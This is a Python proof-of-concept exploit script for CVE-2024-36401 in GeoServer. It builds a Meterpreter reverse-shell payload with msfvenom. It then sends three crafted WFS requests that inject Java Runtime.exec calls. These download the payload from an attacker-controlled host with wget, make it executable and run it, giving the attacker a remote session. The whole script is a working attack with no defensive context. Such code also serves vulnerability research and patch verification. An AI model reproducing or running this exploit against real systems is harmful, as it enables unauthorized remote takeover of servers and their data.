import requests
import sys
import os
import time

def generate_payload(lhost, lport):
    print("\n=======================================")
    print("[!] Generating MSF Payload: shell")
    os.system(f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell")
    time.sleep(3)  # Wait for payload generation to complete

def attempt_exploit(domain, evil_url, lhost, lport):
    print("\n=======================================")
    print("[!] Attempting CVE-2024-36401 PoC")
    print("---------------------------------------")
    print(f"[*] Domain: http://{domain}/geoserver")
    print(f"[*] Evil-URL: http://{evil_url}")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    print("=======================================\n")

    # Step 1: Download the payload
    download_payload_url = (f"http://{domain}:8080/geoserver/topp/wfs"
                            "?service=WFS"
                            "&version=2.0.0"
                            "&request=GetPropertyValue"
                            "&typeNames=topp%3Astates"
                            f"&valueReference=exec(java.lang.Runtime.getRuntime()%2c'wget%20http://{evil_url}/shell')")
    requests.get(download_payload_url)
    time.sleep(1)

    # Step 2: Set execute permission on the payload
    set_exec_url = (f"http://{domain}:8080/geoserver/topp/wfs"
                    "?service=WFS"
                    "&version=2.0.0"
                    "&request=GetPropertyValue"
                    "&typeNames=topp%3Astates"
                    "&valueReference=exec(java.lang.Runtime.getRuntime()%2c'chmod%20%2bx%20./shell')")
    requests.get(set_exec_url)

    # Step 3: Execute the payload
    run_shell_url = (f"http://{domain}:8080/geoserver/topp/wfs"
                     "?service=WFS"
                     "&version=2.0.0"
                     "&request=GetPropertyValue"
                     "&typeNames=topp%3Astates"
                     "&valueReference=exec(java.lang.Runtime.getRuntime()%2c'./shell')")
    requests.get(run_shell_url)

    print("\n[!] Check for new session")

def main():
    if len(sys.argv) != 5:
        print("Usage: poc.py <domain> <payload_URL> <LHOST> <LPORT>")
        sys.exit(1)

    domain = sys.argv[1]
    evil_url = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]

    generate_payload(lhost, lport)
    attempt_exploit(domain, evil_url, lhost, lport)

if __name__ == "__main__":
    main()
